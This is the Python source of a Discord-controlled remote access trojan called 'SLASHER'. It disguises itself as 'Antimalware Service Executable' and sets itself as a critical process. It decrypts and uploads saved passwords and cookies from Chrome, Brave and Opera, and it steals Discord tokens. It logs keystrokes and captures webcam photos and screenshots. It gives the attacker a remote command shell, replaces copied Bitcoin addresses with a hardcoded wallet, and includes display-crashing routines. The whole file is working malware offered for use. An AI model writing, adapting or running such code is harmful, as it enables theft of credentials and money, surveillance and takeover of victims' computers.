import win32crypt
import requests 
import discord
import cv2
import psutil
import pyautogui
import mimetypes
import pyperclip
import pyttsx3
from discord.ext import commands
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from pynput import keyboard

import keyboard as kb
import sqlite3
import os
import getpass
import shutil
import json
import base64
import threading
import warnings
import winreg
import time
import ctypes
import subprocess
import sys
import datetime
import asyncio
import re
import glob
import zipfile


TOKEN = ""


print("[+] Libs Imported Successfully")

ctypes.windll.kernel32.SetConsoleTitleW("Antimalware Service Executable")

def make_persistent():
    while True:
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) 
            break
        except:
            continue

threading.Thread(target=make_persistent, daemon=True).start()

scripts = os.path.dirname(sys.executable)+r"\Scripts"
for file in os.listdir(scripts):
    if glob.glob(os.path.join(scripts, "pip*.exe")):
        pip = glob.glob(os.path.join(scripts, "pip*.exe"))[0]
        print(pip)
        break

cwd = os.getcwd()
user = getpass.getuser()
client = commands.Bot(command_prefix=".", intents=discord.Intents.all())

channel = None
logging = ""
cmd_active = False
chrome_exists = False
brave_exists = False
opera_exists = False
firefox_exists = False
webcam_exists = False

def check_channel():
    global channel
    async def check(ctx):
        return ctx.channel == channel  
    return commands.check(check)

def is_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    
def get_ip():
    ip = requests.get("https://icanhazip.com/")
    ip = ip.content.decode('utf-8').strip()
    return ip
            
@client.event
async def on_ready():
    os.chdir(cwd)
    global channel
    global chrome_exists
    global brave_exists 
    global opera_exists
    global firefox_exists
    global webcam_exists
    global running

    id = int("discord_server_id")
    guild = client.get_guild(id)
    
    for existing_channel in guild.text_channels:
        if existing_channel.name == user:
            channel = existing_channel
            break
    
    if not channel:
        channel = await guild.create_text_channel(user)
        chrome_display = ":x:"
        
    chrome_exists = False

    brave_display = ":x:"
    brave_exists = False

    opera_display = ":x:"
    opera_exists = False

    firefox_display = ":x:"
    firefox_exists = False

    webcam_display = ":x:"
    webcam_exists = False

    if os.path.exists(fr"C:\Program Files\Google\Chrome\Application\chrome.exe"):
        chrome_display = ":white_check_mark:"
        chrome_exists = True
    if os.path.exists(fr"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"):
        brave_display = ":white_check_mark:"
        brave_exists = True
    if os.path.exists(fr"C:\Users\{user}\AppData\Local\Programs\Opera GX\opera.exe"):
        opera_display = ":white_check_mark:"
        opera_exists = True
    if os.path.exists(fr"C:\Program Files\Mozilla Firefox\firefox.exe"):
        firefox_display = ":white_check_mark:"
        firefox_exists = True

    capture = cv2.VideoCapture(0)
    if capture.isOpened():
        webcam_display = ":white_check_mark:"
        webcam_exists = True
    
    t = datetime.datetime.now()
    r = requests.get("https://ipinfo.io/json")
    ipdata = r.json()

    await passwords(None)
    await tokens(None)
    embed = discord.Embed(
        color=discord.Color.green(),
        title=f"SLASHER CONNECTED | {user}\n{t.month}/{t.day}/{t.minute}  |  {t.hour}:{t.minute}",
        description=f"""
**```
IP       : {get_ip()}
City     : {ipdata["city"]}
Region   : {ipdata["region"]}
Country  : {ipdata["country"]}
ZIP      : {ipdata["postal"]}
Hostname : {ipdata["hostname"]}
```**
**```

Webcam   : {webcam_exists}

Chrome   : {chrome_exists}
Brave    : {brave_exists}
Opera GX : {opera_exists}
FireFox  : {firefox_exists}
```**

```Python Version: {sys.version}
\nSelf Executable: \n{os.path.abspath(__file__)}
\nPython Executable: \n{sys.executable}
\nPip Executable: \n{pip}```""")
    await channel.send(embed=embed)

    embed = discord.Embed(color=discord.Color.brand_green(), title="[+] Keylogger Started")
    await channel.send(embed=embed)
    await client.loop.create_task(swapper())



    
@client.event
@check_channel()
async def on_command_error(ctx, error):
    global channel
    if isinstance(error, commands.CommandNotFound): 
        await channel.send("Unknown command")




@client.command()
@check_channel()
async def chrome(ctx):
    global channel
    ### Remove Leftover Files
    if os.path.exists("./chrome_cookies.txt"):
        os.remove("./chrome_cookies.txt")
    
    if os.path.exists("./Cookies"):
            os.remove("./Cookies")
    
    if os.path.exists("./Login Data"):
        os.remove("./Login Data")

    if os.path.exists("./chrome.txt"):
        os.remove("./chrome.txt")
    ###

    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Local State", "./")
    with open(path, "r") as f:
        local_state = json.load(f)
        os.system(f"attrib +h \"{path}\"") 
    dpapi_encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    os.remove("./Local State")
    dpapi_encrypted_key = dpapi_encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(dpapi_encrypted_key, None, None, None, 0)[1]


    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
        os.system("taskkill /F /IM chrome.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = cursor.fetchall()
    conn.close()
    with open("./chrome.txt", 'w') as f:
        path = "./chrome.txt"
        os.system(f"attrib +h \"{path}\"")
        for url, username_value, password_value in results:
            cipher = AES.new(key, AES.MODE_GCM, nonce=password_value[3:15])
            decrypted_pass = cipher.decrypt(password_value[15:])
            decrypted_password = decrypted_pass[:-16].decode()
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username_value}\n")
            f.write(f"Password: {decrypted_password}\n")
            f.write("------------------------\n")
            
    # COOKIES #

    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
       os.system("taskkill /F /IM chrome.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Cookies")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, CAST(encrypted_value AS BLOB) FROM cookies")
    results = cursor.fetchall()
    conn.close()
    with open("chrome_cookies.txt", "w", encoding='utf-8') as f:
        path = "./chrome_cookies.txt"
        os.system(f"attrib +h \"{path}\"")
        for host_key, encrypted_value in results:
            cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
            decrypted_val = cipher.decrypt(encrypted_value[15:])
            decrypted_value = decrypted_val[:-16]
            decrypted_value = base64.b64encode(decrypted_value).decode()

            f.write(f"URL: {host_key}\n")
            f.write(f"Cookie: {decrypted_value}\n")
            f.write("------------------------\n")

    embed = discord.Embed(color=discord.Color.brand_green(), title="^^^ Chrome Passwords & Cookies ^^^")
    files = [discord.File('./chrome.txt'), discord.File("./chrome_cookies.txt")]
    await channel.send(embed=embed, files=files)
    
    os.remove("./chrome_cookies.txt")

    os.remove("./Cookies")

    os.remove("./Login Data")

    os.remove("./chrome.txt")

@client.command()
@check_channel()
async def brave(ctx):
    global channel

    ### Remove Leftover Files
    if os.path.exists("./brave_cookies.txt"):
        os.remove("./brave_cookies.txt")

    if os.path.exists("./Cookies"):
        os.remove("./Cookies")

    if os.path.exists("./Login Data"):
        os.remove("./Login Data")

    if os.path.exists("./brave.txt"):
        os.remove("./brave.txt")
    ###

    path = shutil.copy(f"C:/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State", "./")
    with open(path, "r") as f:
        local_state = json.load(f)
        os.system(f"attrib +h \"{path}\"") 
    dpapi_encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    os.remove("./Local State")
    dpapi_encrypted_key = dpapi_encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(dpapi_encrypted_key, None, None, None, 0)[1]

    if "brave.exe" in (i.name() for i in psutil.process_iter()):
        os.system("taskkill /F /IM brave.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", "./Login Data")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = cursor.fetchall()
    conn.close()
    with open("./brave.txt", 'w') as f:
        path = "./brave.txt"
        os.system(f"attrib +h \"{path}\"")
        for url, username_value, password_value in results:
            cipher = AES.new(key, AES.MODE_GCM, nonce=password_value[3:15])
            decrypted_pass = cipher.decrypt(password_value[15:])
            decrypted_password = decrypted_pass[:-16].decode()
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username_value}\n")
            f.write(f"Password: {decrypted_password}\n")
            f.write("------------------------\n")
            
    # COOKIES #

    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
       os.system("taskkill /F /IM chrome.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Cookies")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, CAST(encrypted_value AS BLOB) FROM cookies")
    results = cursor.fetchall()
    conn.close()
    with open("brave_cookies.txt", "w", encoding='utf-8') as f:
        path = "./brave_cookies.txt"
        os.system(f"attrib +h \"{path}\"")
        for host_key, encrypted_value in results:

            cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
            decrypted_val = cipher.decrypt(encrypted_value[15:])
            decrypted_value = decrypted_val[:-16]
            decrypted_value = base64.b64encode(decrypted_value).decode()

            f.write(f"URL: {host_key}\n")
            f.write(f"Cookie: {decrypted_value}\n")
            f.write("------------------------\n")

    embed = discord.Embed(color=discord.Color.brand_green(), title="^^^ Brave Passwords & Cookies ^^^")
    files = [discord.File('./brave.txt'), discord.File("./brave_cookies.txt")]
    await channel.send(embed=embed, files=files)
    
    
    os.remove("./brave_cookies.txt")

    os.remove("./Cookies")

    os.remove("./Login Data")

    os.remove("./brave.txt")

@client.command()
@check_channel()
async def opera(ctx):
    global channel

    ### Remove Leftover Files
    if os.path.exists("./opera_cookies.txt"):
        os.remove("./opera_cookies.txt")

    if os.path.exists("./Cookies"):
        os.remove("./Cookies")

    if os.path.exists("./Login Data"):
        os.remove("./Login Data")

    if os.path.exists("./opera.txt"):
        os.remove("./opera.txt")
    ### 

    path = shutil.copy(f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera GX Stable/Local State", "./")
    with open(path, "r") as f:
        local_state = json.load(f)
        os.system(f"attrib +h \"{path}\"") 
    dpapi_encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    os.remove("./Local State")
    dpapi_encrypted_key = dpapi_encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(dpapi_encrypted_key, None, None, None, 0)[1]

    if "opera.exe" in (i.name() for i in psutil.process_iter()):
        os.system("taskkill /F /IM opera.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera GX Stable/Login Data", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = cursor.fetchall()
    conn.close()
    with open("./opera.txt", 'w') as f:
        path = "./opera.txt"
        os.system(f"attrib +h \"{path}\"")
        for url, username_value, password_value in results:
            cipher = AES.new(key, AES.MODE_GCM, nonce=password_value[3:15])
            decrypted_pass = cipher.decrypt(password_value[15:])
            decrypted_password = decrypted_pass[:-16].decode()
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username_value}\n")
            f.write(f"Password: {decrypted_password}\n")
            f.write("------------------------\n")
            
    # COOKIES #

    if "opera.exe" in (i.name() for i in psutil.process_iter()):
       os.system("taskkill /F /IM opera.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Cookies")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, CAST(encrypted_value AS BLOB) FROM cookies")
    results = cursor.fetchall()
    conn.close()
    with open("opera_cookies.txt", "w", encoding='utf-8') as f:
        path = "./opera_cookies.txt"
        os.system(f"attrib +h \"{path}\"")
        for host_key, encrypted_value in results:

            cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
            decrypted_val = cipher.decrypt(encrypted_value[15:])
            decrypted_value = decrypted_val[:-16]
            decrypted_value = base64.b64encode(decrypted_value).decode()

            f.write(f"URL: {host_key}\n")
            f.write(f"Cookie: {decrypted_value}\n")
            f.write("------------------------\n")
    embed = discord.Embed(color=discord.Color.brand_green(), title="^^^ Opera Passwords & Cookies ^^^")
    files = [discord.File('./opera.txt'), discord.File("./opera_cookies.txt")]
    await channel.send(embed=embed, files=files)
    
    
    os.remove("./opera_cookies.txt")

    os.remove("./Cookies")

    os.remove("./Login Data")

    os.remove("./opera.txt")

@client.command(aliases=["password", "pass", "p"])
@check_channel()
async def passwords(ctx):
    if chrome_exists == True: await chrome(None)
    if brave_exists == True: await brave(None)
    if opera_exists == True: await opera(None)


@client.command()
@check_channel()
async def photo(ctx):
    global channel
    capture = cv2.VideoCapture(0)
    if capture.isOpened():
        ret, frame = capture.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            capture.release()
            os.system(f"attrib +h \"webcam.jpg\"")
            await channel.send(file=discord.File('webcam.jpg'))
            time.sleep(1)
            os.remove("webcam.jpg")
    capture.release()

@client.command()
@check_channel()
async def alert(ctx, *, arg1):
    global channel
    alert_thread = threading.Thread(target=pyautogui.alert, args=(arg1, " "))
    alert_thread.start()
    await channel.send("```Alert displayed```")

@client.command()
@check_channel()
async def endsession(ctx):
    global channel
    os.system("taskkill /F /IM wscript.exe")
    os.system("taskkill /F /IM python.exe")
    await channel.send(embed=discord.Embed(title=f"Bot Session Terminated\n`{user}`", color=discord.Color.brand_green()), content="The bot session will restart when the user performs a system restart.")
    exit()

@client.command()
@check_channel()
async def ss(ctx):
    img = pyautogui.screenshot()
    img.save("./screenshot.png")
    await channel.send(file=discord.File('./screenshot.png'))
    os.remove("./screenshot.png")

@client.command()
@check_channel()
async def shell(ctx):
    global channel
    global cmd_active
    cmd_active = True
    await channel.send(f"```Command line session started. Use .cmd <command> to execute commands.\nfrom: {cwd}```")

@client.command(aliases=["e"])
@check_channel()
async def cmd(ctx, *, command):
      global channel
      global cwd
      if cmd_active:
          await channel.send(f"```from: {cwd}```")
          try:
              if command.startswith('cd'):
                  new_dir = command[3:]
                  os.chdir(new_dir)
                  cwd = os.getcwd()
                  await channel.send(f"```changed directory to: {cwd}```")
              else:
                  output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=cwd).decode('utf-8')
                  if len(output) > 1900:
                      chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
                      for chunk in chunks:
                          await channel.send(f"```{chunk}```")
                  else:
                      await channel.send(f"```{output}```")
          except subprocess.CalledProcessError as e:
              await channel.send(f"```: {e.output.decode('utf-8')}```")
          except Exception as e:
              await channel.send(f"```: {str(e)}```")
      else:
          await channel.send("Start a command line session first with .shell")

@client.command()
@check_channel()
async def endshell(ctx):
    global channel
    global cmd_active
    cmd_active = False
    await channel.send("```Command line session ended```")

@client.command()
@check_channel()
async def wallpaper(ctx, *, url):
    global channel
    r = requests.get(url, "rb")
    content_type = r.headers['content-type']
    extension = mimetypes.guess_extension(content_type)
    filename = "background"+extension
    path = os.path.abspath(filename)
    with open(filename, "wb") as f:
        f.write(r.content)
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
    await channel.send("```Background Changed```")
    os.remove(filename)    

@client.command()
@check_channel()
async def all(ctx):
    global channel
    embed = discord.Embed(
        title=f"Connected | {user}",
        description=f"IP: {get_ip()}\nFrom: {cwd}",
        color=discord.Color.brand_red()
    )
    await channel.send(embed=embed)
    await chrome(ctx)
    await ss(ctx)
    await photo(ctx)

@client.command(aliases=["say"])
@check_channel()
async def tts(ctx, *, words):
    global channel
    
    try:
        engine = pyttsx3.init()
        if engine is None:
            await channel.send("Failed to initialize TTS engine")
            return
            
        engine.say(str(words))
        engine.runAndWait()
        await channel.send("Successfully played TTS message")
        
    except Exception as e:
        await channel.send(f"TTS Error: {str(e)}")
    finally:
        if engine:
            engine.stop()


def on_press(key):
    global f
    try:
        if key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.backspace:
            f.write("[DEL]")
        elif key.char:
            if key.char.isupper():
                f.write(key.char.upper())
            f.write(key.char)
        elif key == keyboard.Key.shift():
            pass
        else:
            pass

        f.flush()
    except AttributeError:
        pass

@client.command()
@check_channel()
async def keydump(ctx):
    global f
    global channel
    await channel.send(file=discord.File('./keylog.txt'))

async def swapper():
    global channel

    await channel.send(embed = discord.Embed(title="[+] BTC Swapper Started", color=discord.Color.brand_green()))

    swap = "bc1q0gck3mqjte2gl9res7fxym53tcfvuka5985kkf5802zfr0dmthhqppz74h"
    regex = r"^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{39,59})$"
    p = re.compile(regex)
    while True:
        try:
            orig = pyperclip.paste()
            if re.search(p, orig) and pyperclip.paste() != swap:
                pyperclip.copy("")
                await asyncio.sleep(0.1)
                pyperclip.copy(swap)
                await channel.send(embed=discord.Embed(title="$$$ Swapped BTC Address $$$", description=f"Copied:\n`{orig}`\nSwapped To:\n`{swap}`",color=discord.Color.brand_green()))

        except Exception as e:
            await channel.send(embed=discord.Embed(title=f"Error Swapping BTC Address: {e}", color=discord.Color.brand_red()))

        await asyncio.sleep(0.1)

@client.command(aliases=["off", "shut"])
@check_channel()
async def shutdown(ctx):
    await channel.send(embed=discord.Embed(title=f"Shut Down System: {user}. The script will restart when the user logs back on.", color=discord.Color.brand_green()))
    subprocess.run(["powershell", "-Command", "Stop-Computer"])


@client.command(aliases=["discord", "token", "tokenlog"])
async def tokens(ctx):
    tokens = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    nonmfa = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
    mfa = r"dQw4w9WgXcQ:mfa\.[^.*\['(.*)'\].*$][^\"]*"
    regex = re.compile(f"{nonmfa}|{mfa}")

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary', 
        'Discord PTB': roaming + '\\discordptb',
        'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    }

    for key, path in paths.items():
        if not os.path.exists(path):
            continue
        path += "\\Local State"
        if os.path.exists(path):
            with open(path, 'r') as f:
                localstate = json.load(f)
                key = base64.b64decode(localstate['os_crypt']['encrypted_key'])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                tokens_path = path.replace('Local State', 'Local Storage\\leveldb')

                for file in os.listdir(tokens_path):
                    if file.endswith('.ldb'):
                        with open(os.path.join(tokens_path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f.readlines():
                                if line.strip():
                                    for token in re.findall(regex, line):
                                        try:
                                            token = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
                                            cipher = AES.new(key, AES.MODE_GCM, token[3:15])
                                            decrypted = cipher.decrypt(token[15:])[:-16].decode()
                                            if decrypted not in tokens:
                                                tokens.append(decrypted)
                                        except:
                                            pass
    if tokens != []:
        tokens = "\n".join(tokens)
        embed = discord.Embed(title="[+] Discord Tokens Found:", description=f"```{tokens}```", color=discord.Color.brand_green())
        await channel.send(embed=embed)

    else:
        embed = discord.Embed(title="[-] No Discord Tokens Found", color= discord.Color.brand_red())
        await channel.send(embed=embed)



# CRASHERS
def reset_drivers():
    while True:
        kb.send("win+ctrl+shift+b")

def spam_res():
    while True:
        user32 = ctypes.WinDLL('user32')
        user32.ChangeDisplaySettingsW(None, 0)
        user32.ChangeDisplaySettingsW(None, 1)
        time.sleep(0.1)
######

@client.command(aliases=["rape"])
@check_channel()
async def lag(ctx):
    threading.Thread(target=reset_drivers).start()
    threading.Thread(target=reset_drivers).start()
    threading.Thread(target=spam_res).start()

@client.command(aliases=["up", "on"])
async def online(ctx):
    await ctx.send(user)



f = open(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\keylog.txt", 'w')

listener = keyboard.Listener(on_press=on_press).start()

client.run(TOKEN)